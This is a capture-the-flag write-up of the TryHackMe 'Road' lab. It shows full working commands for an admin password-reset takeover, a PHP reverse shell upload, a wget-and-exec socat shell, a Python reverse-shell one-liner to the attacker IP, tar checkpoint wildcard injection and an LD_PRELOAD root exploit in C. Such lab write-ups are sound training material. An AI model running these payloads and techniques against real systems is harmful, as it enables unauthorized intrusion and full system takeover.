# Road

## Introduction:

Welcome to my another writeup! In this TryHackMe [Road](https://tryhackme.com/room/road) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> Inspired by a real-world pentesting engagement

As usual, obtain the user and root flag.

> Difficulty: Medium

- Overall difficulty for me: Medium
    - Initial foothold: Medium
    - Privilege Escalation: Easy

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# export RHOSTS=10.10.172.86 
                                                                                                                         
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 -a $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
|_http-title: Sky Couriers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 8.2p1 Ubuntu
80                | Apache 2.4.41

## HTTP on Port 80

Always enumerate HTTP first, as it has the largest attack vectors.

Let's enumerate hidden directories via `gobuster`:

**Gobuster:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# gobuster dir -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/common.txt -t 100 
[...]
/assets               (Status: 301) [Size: 313] [--> http://10.10.172.86/assets/]
/index.html           (Status: 200) [Size: 19607]                                
/phpMyAdmin           (Status: 301) [Size: 317] [--> http://10.10.172.86/phpMyAdmin/]
/server-status        (Status: 403) [Size: 277]                                      
/v2                   (Status: 301) [Size: 309] [--> http://10.10.172.86/v2/]
```

Found interesting directories: `/phpmyadmin/`, `/v2/`.

In the `/v2/` directory, we see that it's redirecting me to a login page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a1.png)

**View-Source:**
```html
    <div class="login">
      <div class="login-body">
        <a class="login-brand" href="/v2/admin">
          <img class="img-responsive" src="../../assets/img/logo.png" alt="Sky">
        </a>
        <h3 class="login-heading">Sign in</h3>
        <div class="login-form">
          <form action="logincheck.php" method="post">
            		<div class="alert alert-danger" style="display:none;">
				<button class="close" data-close="alert"></button>
				<span>Enter any username and password. </span>
			</div>
            <div class="md-form-group md-label-floating">
              <input class="md-form-control" type="text" name="user" id="username" spellcheck="false" autocomplete="off" data-msg-required="Please enter your username." required>
              <input type="hidden" name="ci_csrf_token" value="">
              <label class="md-control-label">Username</label>
            </div>
            <div class="md-form-group md-label-floating">
              <input class="md-form-control" type="password" name="pass" data-msg-minlength="" data-msg-required="Please enter your password." required autocomplete="off">
              <label class="md-control-label">Password</label>
            </div>            
            <button class="btn btn-primary btn-block" id="myBtn" name="submit" type="Submit">Sign in</button><br/>
          </form>
		  <form action="register.html" method="get">
			<button class="btn btn-primary btn-block" name="register" type="Submit">Register</button>
           </form>
        </div>
      </div>
    </div>
```

In the "View-Source", when we click the "submit" button, we're sending a POST request to `logincheck.php`.

**Curl:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# curl -X POST http://$RHOSTS/v2/admin/logincheck.php -d ""                    
Please fill both the username and password fields!

┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# curl -X POST http://$RHOSTS/v2/admin/logincheck.php -d "user=admin&pass=test" 
Incorrect username and/or password!                                                                                                                    
```

I tried to brute force it, but no luck.

**Hydra:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt $RHOSTS http-post-form "/v2/admin/logincheck.php:user=^USER^&pass=^PASS^:Incorrect username and/or password" -t 64
[...]
[STATUS] 3231.00 tries/min, 3231 tries in 00:01h, 243851552 to do in 1257:53h, 64 active
[STATUS] 3337.00 tries/min, 10011 tries in 00:03h, 243844772 to do in 1217:54h, 64 active
```

In the `index.html`, I also found a domain for this machine:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a2.png)

Let's add this domain to `/etc/hosts`!

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# echo "$RHOSTS skycouriers.thm" | tee -a /etc/hosts
```

Since we found a domain, why not fuzzing it's subdomain?

**FFuf:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://skycouriers.thm/ -H "Host: FUZZ.skycouriers.thm" -fw 2975
[...]
:: Progress: [19966/19966] :: Job [1/1] :: 184 req/sec :: Duration: [0:01:52] :: Errors: 0 ::
```

Nothing...

Okay... Let's enumerate the website much deeper:

**Gobuster:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# gobuster dir -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x txt,php,html,bak
[...]
/assets               (Status: 301) [Size: 313] [--> http://10.10.172.86/assets/]
/career.html          (Status: 200) [Size: 9289]                                 
/index.html           (Status: 200) [Size: 19607]                                
/phpMyAdmin           (Status: 301) [Size: 317] [--> http://10.10.172.86/phpMyAdmin/]
/server-status        (Status: 403) [Size: 277]                                      
/v2                   (Status: 301) [Size: 309] [--> http://10.10.172.86/v2/] 
```

Let's look at `/career.html`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a3.png)

Hmm... The "Current Job Opening" looks truncated. Let's look at the "View-Source":

**View-Source:**
```html
<div class="container">

  <h3 style="color:#bb2b2b!important;font-weight:bold;">Current Job Opening</h3>
    <div class="slider-opening">
      <div class="owl-carousel owl-theme">
                  </div>
    </div>
  </div>  
<div class="container">  
<div class="shower"  style="display:none">  
      
<form method="post" enctype="multipart/form-data">
           <div class="form-group">
      <label for="usr">Your Name:</label>
      <input type="text" class="form-control" name="uname" id="usr" required>
    </div>
  <div class="addDiv">
  
  </div>
    <div class="form-group">
      <label for="pwd">Email id:</label>
      <input type="email" class="form-control" name="email" id="pwd" required>
    </div>
                     <div class="form-group">
      <label for="pwd">Phone Number:</label>
      <input type="tel" pattern="^\d{10}$" name="contact" class="form-control" id="pwd" required>
    </div>
                     <div class="form-group">
      <label for="pwd">Address 1:</label>
      <input type="text" class="form-control" name="add1" id="pwd" required>
    </div>
                     <div class="form-group">
      <label for="pwd">Address 2:</label>
      <input type="text" name="add2" class="form-control" id="pwd">
    </div>
                     <div class="form-group">
      <label for="pwd">Massage:</label>
      <input type="text" class="form-control" name="msg" id="pwd" style="height:150px;    padding-bottom: 100px;">
    </div>
  
           
            <h3 style="float: left;">Uplod Your Cv/Resume&nbsp;&nbsp;&nbsp;&nbsp;</h3> 
      <input type="file" name="cv" class="top"   style="width: 230px;margin-left: -340px;" required>
           
            <p style="    margin-top: 25px;color:#aaaaaa;">File type doc,pdf,jpg only</p>
            
            <br>
            <center><button type="submit" name="submit"  class="btn" style="border:1px solid #666666!important;">Upload and Send</button></center>
            <br><br>
    </form> 
    </div>    
</div>
```

Looks like it's being hidden:

```html
<div class="shower"  style="display:none">  
```

Let's change the `style`'s value!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a5.png)

Are we able to upload a file?? Let's test it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a6.png)

We can! But where is the file lives?

I tried to brute force directory in `/`, `/v2/admin/`, `/v2/`, but nothing stands out. My best guess is this is a rabbit hole.

Alright. Since `/v2/admin/login.html` has a "register" button, why not register a new account and login to see what's inside?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a7.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a8.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a9.png)

Let's enumerate this page!

Sadly, most of the buttons are useless, but some of them are working.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a10.png)

We can see that there is a button in "Profile" to upload an profile image.

**View-Source:**
```html
	<form method="post" action="" enctype="multipart/form-data">
		<div class="row">
		<div class="form-group col-md-4 has-feedback">
			<label for="name-2" class="control-label">Company Agr</label>
			<input class="form-control" type="text" value="" readonly>
			<span class="form-control-feedback" aria-hidden="true">
				<span class="icon"></span>
			</span>
			<small class="help-block">&nbsp;</small>
		</div>
		<div class="col-md-4">
		<div class="form-group">
		<label>Select Profile Image</label>
		<input type="file" class="form-control" name="pimage" >
		</div>
		Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.		</div>
		</div>
		<input type="hidden" name="ci_csrf_token" value="">
		<input type="hidden" name="uname" value="ADMIN" >
		<input type="submit" class="btn btn-info"  name="submit" value="Edit Profile">
		
		</form>
	</div>
</div>	
<!-- /v2/profileimages/ -->
```

As we can see, there is a comment: `/v2/profileimages/`, maybe it's a directory for the uploaded profile image?? Let's check that out:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a11.png)

Hmm... `Directory listing is disabled.`.

Also, the "Search" button on the top seems interesting:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a12.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a13.png)

**Curl:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# curl -vv "http://skycouriers.thm/v2/admin/track_orders.php?awb=test"     
[...]
< refresh: 5;url=../index.php
[...]

Due to huge amount of complaints, we are currently working on fixing this. Sorry for the inconvenience.
```

And it has a "refresh" HTTP header, which is after 5 seconds, it'll refresh to `/v2/index.php`.

I tried SQL Injection, LFI, but no dice.

Again. Take a step back.

We also see the "Users" -> "ResetUser" is the only thing we can interactive with, and the "Username" field is greyed out.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a14.png)

So, **what if we can control the "Username" field??** Let's capture this POST request in Burp Suite:

**Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a15.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a16.png)

As we can see, we can control the "Username" field. Also, think back what we've saw, in the "Profile" page, there is an admin email in cleartext.

```
Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.
```

- Admin email: admin@sky.thm

Hmm... What if we change admin's password?! Let's do this:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a17.png)

Now, let's logout our current user, and try to login as admin:

- Username: admin@sky.thm
- Password: password

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a18.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a19.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a20.png)

We're in!!!

# Initial Foothold

Since we're in the admin account, we should able to upload a PHP reverse shell in the "Profile" page: (Hopefully it doesn't have any filters, otherwise we have to bypass it.)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a21.png)

**To do so, I'll:**

- Copy PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a22.png)

- Upload the PHP reverse shell:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Road/images/a23.png)

Since we've found the uploaded file path, we can trigger the PHP reverse shell via `curl`:

- Setup a `nc` listener and trigger the uploaded PHP reverse shell:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# nc -lnvp 443
listening on [any] 443 ...
```

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# curl http://skycouriers.thm/v2/profileimages/revshell.php

┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.172.86] 54316
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:28:44 up  1:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami;hostname;id;ip a
www-data
sky
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:37:24:bc:4d:e7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.172.86/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2697sec preferred_lft 2697sec
    inet6 fe80::37:24ff:febc:4de7/64 scope link 
       valid_lft forever preferred_lft forever
```

Yes!! We're `www-data`!

**Stable shell via `socat`:**
```
┌──(root💀siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

$ wget http://10.18.61.134/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.18.61.134:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444                  
[...]
www-data@sky:/$ stty rows 22 columns 121
www-data@sky:/$ export TERM=xterm-256color
www-data@sky:/$ ^C
www-data@sky:/$ 
```

**user.txt:**
```
www-data@sky:/$ cat /home/webdeveloper/user.txt 
{Redacted}
```

# Privilege Escalation

## www-data to webdeveloper

**LinPEAS:**
```
www-data@sky:/tmp$ ./linpeas.sh -q
[...]
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0      511             127.0.0.1:9000         0.0.0.0:*            
tcp   LISTEN 0      4096            127.0.0.1:27017        0.0.0.0:*            
tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN 0      511                     *:80                 *:*            
tcp   LISTEN 0      128                  [::]:22              [::]:*
[...]
╔══════════╣ MySQL version
mysql  Ver 8.0.25-0ubuntu0.20.04.1 for Linux on x86_64 ((Ubuntu))

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No
```

In the `LinPEAS` output, we can see 4 ports are opened internally: `33060`, `27017`, `9000`, `3306`.

We can ignore port `3306`(MySQL default port), as we couldn't login to MySQL right now.

Now, let's do a **dynamic port forwarding** to investigate what those ports doing.

To do so, I'll use `chisel`:

- Transfer `chisel` to the target machine:

```
┌──(root💀siunam)-[/opt/chisel]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@sky:/tmp$ wget http://10.18.61.134/chiselx64 -O /tmp/chisel;chmod +x /tmp/chisel
```

- Dynamic port forwarding via `chisel`:

```
┌──(root💀siunam)-[/opt/chisel]
└─# ./chiselx64 server -p 8888 --reverse

www-data@sky:/tmp$ ./chisel client 10.18.61.134:8888 R:socks
```

Now, we can use `proxychains` to communicate those ports in the attacker machine. Let's use `nmap` to scan those ports:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/Road]
└─# proxychains nmap -sT -sC -sV -p9000,27017,33060 127.0.0.1
[...]
PORT      STATE SERVICE     VERSION
9000/tcp  open  cslistener?
27017/tcp open  mongodb     MongoDB 4.4.6
|_mongodb-info: ERROR: Script execution failed (use -d to debug)
| mongodb-databases: 
|   databases
|     0
|       empty = false
|       name = admin
|       sizeOnDisk = 40960.0
|     3
|       empty = false
|       name = local
|       sizeOnDisk = 73728.0
|     2
|       empty = false
|       name = config
|       sizeOnDisk = 36864.0
|     1
|       empty = false
|       name = backup
|       sizeOnDisk = 98304.0
|   ok = 1.0
|_  totalSize = 249856.0
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```

Looks like port `27017` is **MongoDB**, let's disconnect the `chisel client` session and enumerate the MongoDB databases:

```
www-data@sky:/tmp$ mongo --port 27017            
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
[...]

> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
```

Some interesting databases!

**backup:**
```
> use backup
switched to db backup

> show collections
collection
user

> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "{Redacted}" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }

> exit
```

Found crentenials for user `webdeveloper`!

Let's **Switch User** to `webdeveloper`:

```
www-data@sky:/tmp$ su webdeveloper
Password: 
webdeveloper@sky:/tmp$ whoami;id
webdeveloper
uid=1000(webdeveloper) gid=1000(webdeveloper) groups=1000(webdeveloper),24(cdrom),27(sudo),30(dip),46(plugdev)
```

## webdeveloper to root

**Sudo Permission:**
```
webdeveloper@sky:/tmp$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

Let's check out what `/usr/bin/sky_backup_utility` is doing!

```
webdeveloper@sky:/tmp$ ls -lah /usr/bin/sky_backup_utility
-rwxr-xr-x 1 root root 17K Aug  7  2021 /usr/bin/sky_backup_utility

webdeveloper@sky:/tmp$ strings /usr/bin/sky_backup_utility
[...]
Sky Backup Utility
Now attempting to backup Sky
tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*
Backup failed!
Check your permissions!
Backup successful!
[...]
```

> Note: We can't exploit `tar`'s relative path, as we have `secure_path` the variable.

Nice! It's using `tar` to backup everything in `/var/www/html/` **via a wildcard(`*`)** and store it in `/root/.backup/`, which is exploitable!

According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), we can escalate to root via 2 options: `--checkpoint=1`, `--checkpoint-action=exec=/bin/sh`.

Let's do this!

First, create a python reverse shell in `/var/www/html/`:

```
webdeveloper@sky:/var/www/html$ cat << EOF > revshell.sh
> python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.18.61.134",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
> EOF
bash: revshell.sh: Permission denied

webdeveloper@sky:/var/www/html$ ls -lah
total 52K
drwxr-xr-x  5 www-data www-data 4.0K Oct 17  2021 .
```

Ahh, I forgot this directory only writable for `www-data`. Let's exit our current shell, and switch to `www-data`:

- Create a python reverse shell in `/var/www/html/` **as `www-data`**:

```
webdeveloper@sky:/var/www/html$ exit

www-data@sky:/var/www/html$ cat << EOF > revshell.sh
> python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.18.61.134",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
> EOF

www-data@sky:/var/www/html$ chmod +x revshell.sh
```

- Create 2 "options" to trigger the exploit:

```
www-data@sky:/var/www/html$ echo "" > "--checkpoint=1"
www-data@sky:/var/www/html$ echo "" > "--checkpoint-action=exec=sh revshell.sh"
```

- Switch User to `webdeveloper`:

```
www-data@sky:/var/www/html$ su webdeveloper
Password: 
webdeveloper@sky:/var/www/html$ 
```

- Run the binary as root:

```
webdeveloper@sky:/var/www/html$ sudo /usr/bin/sky_backup_utility
Sky Backup Utility
Now attempting to backup Sky
tar: Removing leading `/' from member names
/var/www/html/--checkpoint-action=exec=sh revshell.sh
tar: Removing leading `/' from hard link targets
/var/www/html/--checkpoint=1
[...]
Backup successful!
```

And it falled...

Take a step back again, and there is something off in the sudo permssion.

```
webdeveloper@sky:/var/www/html$ sudo -l
[...]
    env_keep+=LD_PRELOAD
```

The `env_keep+=LD_PRELOAD` seems odd to me, so I googled about it:

> LD_PRELOAD is an enviromental variable, commonly used within C programming. This variable is implemented in order to load any library prior to any other form of shared library. Nonetheless, if this is run under high privileges, and the variable is hijacked into a malicious file, a Privilege Escalation vector shall be found. (Source:https://whitecr0wz.github.io/posts/LD_PRELOAD/)

Hmm... Looks like we can hijack the `LD_PRELOAD` enviromental variable!

- Create and compile the C exploit: (From https://whitecr0wz.github.io/posts/LD_PRELOAD/)

```c
webdeveloper@sky:/tmp$ nano exploit.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```
webdeveloper@sky:/tmp$ gcc exploit.c -o exploit -fPIC -shared -nostartfiles -w
```

- Run the backup binary via `sudo` with the `LD_PRELOAD` environment variable that we're in control:

```
webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/exploit /usr/bin/sky_backup_utility
root@sky:/tmp# whoami;hostname;id;ip a
root
sky
uid=0(root) gid=0(root) groups=0(root)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:37:24:bc:4d:e7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.172.86/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2694sec preferred_lft 2694sec
    inet6 fe80::37:24ff:febc:4de7/64 scope link 
       valid_lft forever preferred_lft forever
```

And we're root! :D

# Rooted

**root.txt:**
```
root@sky:/tmp# cat /root/root.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Directory Enumeration
2. Account Hijack via Burp Suite
3. Arbitrary File Upload
4. Privilege Escalation via Cleartext Crendentials in MongoDB `backup` Database
5. Privilege Escalation via Abusing `LD_PRELOAD` Environment Variable